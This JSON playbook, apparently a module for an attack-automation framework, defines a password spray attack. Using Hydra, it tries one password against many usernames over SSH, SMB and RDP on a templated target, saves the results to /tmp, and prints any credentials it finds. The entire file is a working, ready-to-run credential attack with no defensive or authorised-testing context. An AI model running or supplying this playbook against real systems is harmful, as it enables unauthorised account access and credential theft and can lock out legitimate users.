{
  "name": "password_spray",
  "description": "Password spray attack: try a single password across many usernames on multiple protocols using Hydra.",
  "author": "james-linux",
  "version": "1.0",
  "requires_root": false,
  "steps": [
    {
      "id": "spray_ssh",
      "action": "layer.run",
      "params": {
        "command": "hydra -L {{userlist}} -p {{password}} {{target}} ssh -t 4 -f -o /tmp/james_spray_ssh.txt 2>&1 | tail -8",
        "timeout": 300
      },
      "description": "SSH password spray (one password, many users)"
    },
    {
      "id": "spray_smb",
      "action": "layer.run",
      "params": {
        "command": "hydra -L {{userlist}} -p {{password}} {{target}} smb -t 4 -f -o /tmp/james_spray_smb.txt 2>&1 | tail -8",
        "timeout": 300
      },
      "description": "SMB password spray"
    },
    {
      "id": "spray_rdp",
      "action": "layer.run",
      "params": {
        "command": "hydra -L {{userlist}} -p {{password}} {{target}} rdp -t 4 -f -o /tmp/james_spray_rdp.txt 2>&1 | tail -8",
        "timeout": 300
      },
      "description": "RDP password spray"
    },
    {
      "id": "results",
      "action": "layer.run",
      "params": {
        "command": "echo '=== PASSWORD SPRAY RESULTS ===' && for f in /tmp/james_spray_*.txt; do [ -f \"$f\" ] && echo \"--- $(basename $f) ---\" && cat $f; done",
        "timeout": 5
      },
      "description": "Display found credentials"
    }
  ]
}
